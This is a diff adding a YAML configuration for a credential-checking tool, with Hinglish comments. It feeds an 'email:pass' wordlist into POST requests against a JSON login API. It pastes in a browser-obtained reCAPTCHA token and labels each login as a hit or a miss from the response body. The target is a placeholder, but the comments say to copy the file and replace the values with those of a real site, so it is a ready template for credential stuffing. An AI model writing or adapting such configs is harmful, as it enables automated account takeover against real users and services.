@@ -1,0 +1,46 @@
+# EXAMPLE ONLY — kisi bhi JSON login API ka pattern (fake URL)
+# Copy karo, apni site ke DevTools values se replace karo.
+# Storyblocks ya kisi third-party site ka ready config yahan nahi hai.
+
+name: "Example JSON Login API"
+type: http
+wordlist_format: "email:pass"
+
+cloudflare:
+  enabled: false
+
+proxy: false
+timeout: 20
+
+request:
+  method: POST
+  url: "https://example.com/api/login"
+  headers:
+    Content-Type: "application/json"
+    Accept: "application/json"
+    Origin: "https://example.com"
+    Referer: "https://example.com/login"
+  body: |
+    {
+      "email": "{{email}}",
+      "password": "{{password}}",
+      "agreementCheckbox": true,
+      "recaptchaToken": "PASTE_FRESH_TOKEN_FROM_BROWSER_DEVTOOLS"
+    }
+
+# SUCCESS: "success":true — redirectTo value dynamic hai, match mat karo
+success:
+  - type: body_contains
+    value: '"success":true'
+
+# FAIL: invalid credentials
+fail:
+  - type: body_contains
+    value: '"reason":"credentialsInvalid"'
+  - type: body_contains
+    value: '"success":false'
+
+capture:
+  - type: json_path
+    path: "redirectTo"
+    save_as: "redirect"
